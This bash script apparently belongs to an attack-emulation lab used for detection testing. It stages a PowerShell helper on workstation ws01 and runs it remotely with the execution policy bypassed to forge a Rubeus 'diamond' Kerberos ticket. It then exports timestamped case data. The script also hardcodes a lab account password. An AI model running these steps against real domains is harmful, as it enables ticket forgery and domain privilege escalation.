#!/usr/bin/env bash
# T012 — Diamond ticket (Rubeus diamond — Windows-only, staged on ws01)
set -euo pipefail
source "$(dirname "$0")/../lib/campaign-a-common.sh"

CASE_ID="CADRE-T012-DIAMOND-${CASE_DATE:-$(date -u +%Y%m%d)}-ws01"
T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)
echo "=== T012 | ${CASE_ID} | T0=${T0} ==="

ws01_ensure_rubeus

ws01_ensure_rubeus

# Run diamond-ticket via PowerShell helper (avoids quoting hell across WinRM)
PS1="${CAMPAIGN_A_LIB}/../windows/campaign-a-t012-diamond.ps1"
PS1_BASENAME="campaign-a-t012-diamond.ps1"
PS1_REMOTE="C:\\Tools\\cadre-attack\\${PS1_BASENAME}"
WS01_AD_USER=analyst_t1 WS01_AD_PASS='T13r_An@lyst!' bash "${CAMPAIGN_A_LIB}/ws01-stage-file.sh" "$PS1" "$PS1_BASENAME" || true

ws01_exec_as analyst_t1 'T13r_An@lyst!' \
  "powershell -ExecutionPolicy Bypass -File $PS1_REMOTE"

cadre_export "${CASE_ID}" T012 "${T0}" 192.168.77.62
echo "T0=${T0}" | tee "/tmp/${CASE_ID}.t0"
